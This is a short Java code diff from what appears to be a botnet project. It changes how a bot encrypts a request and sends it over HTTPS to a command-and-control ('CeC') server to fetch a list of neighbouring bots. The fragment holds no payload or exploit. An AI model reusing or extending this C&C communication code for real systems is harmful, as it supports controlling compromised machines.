@@ -114,10 +114,10 @@ public class BotRequest {
 	public SyncIpList<IP, PublicKey> askNeighbours(String iPCeC, String ipBot, String data) {
 		SyncIpList<IP, PublicKey> result = null;
 		Integer counter = 0;
-
+		String encryptData="";
 		try {
-			// richiesta al vicinato
-			data = pki.getCrypto().encryptAES(data);
+			// richiesta del vicinato
+			encryptData = pki.getCrypto().encryptAES(data);
 		} catch (InvalidKeyException | NoSuchAlgorithmException | NoSuchPaddingException | UnsupportedEncodingException
 				| InvalidAlgorithmParameterException | IllegalBlockSizeException | BadPaddingException e) {
 			System.out.println("failed to encrypt data during initialize");
@@ -125,11 +125,11 @@ public class BotRequest {
 		}
 		while (counter <= REQNUMBER) {
 			try {
-				System.out.println(" vicinato");
-				result = restTemplate.postForObject("http://" + iPCeC + "/cec/Neighbours", data, result.getClass());
+				String url=HTTPS+ iPCeC + PORT+"/cec/neighbours";
+				System.out.println("Richiesta Vicinato a "+url);
+				result = restTemplate.postForObject(url, encryptData, result.getClass());
 				return result;
 			} catch (Exception e) {
-				System.out.println("\nSono Morto: " + ipBot + " Causa: " + e.getMessage());
 				counter++;
 			}
 			try {
